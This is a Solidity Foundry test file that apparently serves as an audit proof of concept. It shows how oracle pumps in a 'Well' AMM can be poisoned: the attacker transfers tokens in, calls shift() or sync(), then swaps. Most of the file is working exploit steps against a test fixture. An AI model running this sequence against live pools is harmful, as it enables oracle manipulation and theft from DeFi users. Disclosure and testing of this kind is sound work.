// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, Balances, ConstantProduct2, IERC20} from "test/TestHelper.sol";
import {IWell, Call} from "src/interfaces/IWell.sol";
import {IPump} from "src/interfaces/pumps/IPump.sol";
import {console} from "forge-std/Test.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating oracle manipulation via shift() and sync() functions
 *
 * VULNERABILITY DESCRIPTION:
 * The Well contract requires that Pumps (oracles) be updated with the previous block's
 * reserves when reserves change in the current block. However, shift() and sync()
 * functions do NOT call _updatePumps() before modifying reserves, allowing attackers
 * to manipulate reserves in the current block and then trigger pump updates with
 * manipulated values via subsequent swap operations.
 *
 * ATTACK FLOW:
 * 1. Attacker calls shift() to manipulate reserves in the current block
 * 2. Attacker calls swapFrom()/swapTo() to revert reserves back to original state
 * 3. The swap operations call _updatePumps() with the manipulated reserves from step 1
 * 4. Result: Oracle (Pump) is poisoned with invalid reserve data
 */
contract ExploitTest is TestHelper {

    // Custom pump that tracks reserve updates to demonstrate the vulnerability
    TrackingPump trackingPump;

    function setUp() public {
        // Deploy a tracking pump that records reserve updates
        trackingPump = new TrackingPump();

        Call[] memory _pumps = new Call[](1);
        _pumps[0].target = address(trackingPump);
        _pumps[0].data = new bytes(0);

        // Setup well with 2 tokens and our tracking pump
        setupWell(2, _pumps);
    }

    /**
     * @notice Demonstrates oracle manipulation via shift() function
     * @dev This test proves that shift() doesn't update pumps before modifying reserves,
     *      allowing an attacker to poison the oracle with manipulated reserve values
     */
    function test_exploit_shift_oracle_manipulation() public {
        // Initial state: Well has balanced reserves (1000e18 each token)
        uint256[] memory initialReserves = well.getReserves();
        assertEq(initialReserves[0], 1000e18, "Initial reserve 0 should be 1000e18");
        assertEq(initialReserves[1], 1000e18, "Initial reserve 1 should be 1000e18");

        // Record initial pump state (no updates yet)
        uint256 initialUpdateCount = trackingPump.updateCount();

        // STEP 1: Attacker transfers tokens directly to the well to create imbalance
        // This simulates the attacker manipulating reserves
        vm.startPrank(user);
        uint256 manipulationAmount = 500e18;
        tokens[0].transfer(address(well), manipulationAmount);

        // STEP 2: Attacker calls shift() to update reserves with manipulated values
        // CRITICAL: shift() calls _setReserves() but does NOT call _updatePumps() first
        // This means the current block's reserves are set to manipulated values
        well.shift(tokens[1], 0, user);

        // Verify reserves were updated by shift()
        uint256[] memory reservesAfterShift = well.getReserves();
        assertTrue(reservesAfterShift[0] > initialReserves[0], "Reserve 0 should have increased");

        // CRITICAL OBSERVATION: Pump has NOT been updated yet
        assertEq(trackingPump.updateCount(), initialUpdateCount, "Pump should not be updated by shift()");

        // STEP 3: Attacker performs a swap to trigger pump update
        // The swap will call _updatePumps() which reads the manipulated reserves from step 2
        uint256 swapAmount = 100e18;
        tokens[0].approve(address(well), swapAmount);
        well.swapFrom(tokens[0], tokens[1], swapAmount, 0, user, type(uint256).max);

        // PROOF OF VULNERABILITY: Pump was updated with manipulated reserves
        assertEq(trackingPump.updateCount(), initialUpdateCount + 1, "Pump should be updated by swap");

        // The pump received the manipulated reserves (from after shift, before swap)
        uint256[] memory pumpReceivedReserves = trackingPump.lastReserves();

        // These reserves include the manipulation from shift()
        // In a correct implementation, the pump should have been updated BEFORE shift() modified reserves
        assertTrue(
            pumpReceivedReserves[0] > initialReserves[0],
            "Pump received manipulated reserve 0 - VULNERABILITY CONFIRMED"
        );

        // STEP 4: Attacker can now reverse the manipulation via another swap
        // This allows them to extract their funds while leaving the oracle poisoned
        uint256[] memory finalReserves = well.getReserves();

        // The oracle (pump) now contains manipulated data that doesn't reflect
        // the actual price history, as it was updated with artificially inflated reserves
        console.log("Initial Reserve 0:", initialReserves[0]);
        console.log("Pump Recorded Reserve 0:", pumpReceivedReserves[0]);
        console.log("Final Reserve 0:", finalReserves[0]);
        console.log("Manipulation detected: Pump has invalid reserve data");

        vm.stopPrank();
    }

    /**
     * @notice Demonstrates oracle manipulation via sync() function
     * @dev Similar to shift(), sync() doesn't update pumps before modifying reserves
     */
    function test_exploit_sync_oracle_manipulation() public {
        // Initial state
        uint256[] memory initialReserves = well.getReserves();
        uint256 initialUpdateCount = trackingPump.updateCount();

        vm.startPrank(user);

        // STEP 1: Attacker transfers tokens directly to well
        uint256 manipulationAmount = 300e18;
        tokens[0].transfer(address(well), manipulationAmount);

        // STEP 2: Attacker calls sync() to update reserves
        // CRITICAL: sync() calls _setReserves() but does NOT call _updatePumps() first
        well.sync();

        // Verify reserves were updated
        uint256[] memory reservesAfterSync = well.getReserves();
        assertEq(
            reservesAfterSync[0],
            initialReserves[0] + manipulationAmount,
            "Reserve 0 should include transferred amount"
        );

        // Pump has NOT been updated yet
        assertEq(trackingPump.updateCount(), initialUpdateCount, "Pump should not be updated by sync()");

        // STEP 3: Trigger pump update via swap
        uint256 swapAmount = 50e18;
        tokens[0].approve(address(well), swapAmount);
        well.swapFrom(tokens[0], tokens[1], swapAmount, 0, user, type(uint256).max);

        // PROOF: Pump was updated with manipulated reserves
        assertEq(trackingPump.updateCount(), initialUpdateCount + 1, "Pump should be updated by swap");

        uint256[] memory pumpReceivedReserves = trackingPump.lastReserves();

        // Pump received manipulated reserves (from after sync, before swap)
        // The pump should have been updated BEFORE sync() modified reserves, but it wasn't
        assertEq(
            pumpReceivedReserves[0],
            reservesAfterSync[0],
            "Pump received manipulated reserves - VULNERABILITY CONFIRMED"
        );

        console.log("sync() vulnerability confirmed: Oracle poisoned with manipulated reserves");

        vm.stopPrank();
    }

    /**
     * @notice Demonstrates the correct behavior: swaps update pumps BEFORE modifying reserves
     * @dev This shows that swap functions correctly call _updatePumps() first
     */
    function test_correct_behavior_swap_updates_pump_first() public {
        uint256[] memory initialReserves = well.getReserves();
        uint256 initialUpdateCount = trackingPump.updateCount();

        vm.startPrank(user);

        // Perform a swap
        uint256 swapAmount = 100e18;
        tokens[0].approve(address(well), swapAmount);
        well.swapFrom(tokens[0], tokens[1], swapAmount, 0, user, type(uint256).max);

        // Pump was updated
        assertEq(trackingPump.updateCount(), initialUpdateCount + 1, "Pump should be updated");

        // Pump received the reserves BEFORE the swap modified them
        uint256[] memory pumpReceivedReserves = trackingPump.lastReserves();
        assertEq(
            pumpReceivedReserves[0],
            initialReserves[0],
            "Pump should receive pre-swap reserves (correct behavior)"
        );

        vm.stopPrank();
    }
}

/**
 * @title TrackingPump
 * @notice A pump implementation that tracks reserve updates for testing
 * @dev Records each update call to demonstrate when and with what values the pump is updated
 */
contract TrackingPump is IPump {
    uint256 public updateCount;
    uint256[] private _lastReserves;

    /**
     * @notice Called by the Well to update the pump with new reserve data
     * @param reserves The current reserves at the time of update
     */
    function update(uint256[] calldata reserves, bytes calldata) external {
        updateCount++;

        // Store the reserves we received
        delete _lastReserves;
        for (uint256 i = 0; i < reserves.length; i++) {
            _lastReserves.push(reserves[i]);
        }
    }

    /**
     * @notice Returns the reserves from the last update call
     */
    function lastReserves() external view returns (uint256[] memory) {
        return _lastReserves;
    }
}
